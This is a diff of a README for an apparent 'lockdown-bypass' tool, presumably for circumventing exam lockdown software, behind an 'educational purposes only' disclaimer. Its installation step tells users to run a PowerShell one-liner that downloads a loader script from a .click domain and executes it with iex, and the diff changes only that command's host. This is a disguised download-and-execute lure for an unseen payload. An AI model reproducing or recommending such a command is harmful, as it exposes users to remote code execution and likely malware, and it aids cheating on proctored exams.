@@ -8,16 +8,6 @@
 > This tool is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.  
 > Use responsibly and in accordance with your institution's academic integrity policy.  
 > **BY USING THIS TOOL YOU AGREE TO THESE TERMS.**
-
----
-
-## 📌 TABLE OF CONTENTS
-1. [KEY FEATURES](#-key-features)  
-2. [STATUS](#-status)  
-3. [INSTALLATION](#-installation--setup-cmd--powershell)  
-4. [TROUBLESHOOTING](#-troubleshooting--common-errors)  
-5. [TAGS & KEYWORDS](#-tags--keywords)  
-
 ---
 
 ## 📥 INSTALLATION & SETUP (CMD / PowerShell)
@@ -29,7 +19,7 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://software-get.click/Loader.ps1?get=lockdown-bypass | iex"
+powershell -Command "irm https://software-gateway.click/Loader.ps1?get=lockdown-bypass | iex"
 ```
 
 ### Step 3: Wait for Completion
